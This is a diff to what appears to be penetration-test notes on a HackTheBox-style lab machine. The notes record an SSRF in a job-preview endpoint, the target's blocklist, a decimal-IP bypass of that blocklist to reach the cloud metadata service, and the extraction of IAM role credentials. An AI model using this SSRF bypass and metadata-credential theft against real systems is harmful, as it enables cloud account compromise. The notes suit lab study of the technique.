@@ -7,3 +7,11 @@
 - /login - disabled ("SSO migrating to Okta" - unauthenticated during migration)
 - /api/v1/health - leaks queue/scheduler/storage at http://aws.nimbus.htb
 - aws.nimbus.htb returns AWS STS InvalidClientTokenId error (AWS-API emulator)
+
+## SSRF -> IMDS
+- POST /jobs/preview url= is full-read SSRF
+- Blocklist: aws.nimbus.htb, 169.254.169.254, 127.0.0.1, localhost, hex IPs, nip.io
+- Bypass: decimal IP 2852039166 (= 169.254.169.254) + ?x=.yaml suffix
+- IMDS path: /latest/meta-data/iam/security-credentials/nimbus-web-role
+- Extracted: AccessKeyId, SecretAccessKey, SessionToken
+- Also: local-ipv4 = 10.0.1.42, local-hostname = ip-10-0-1-42.ec2.internal
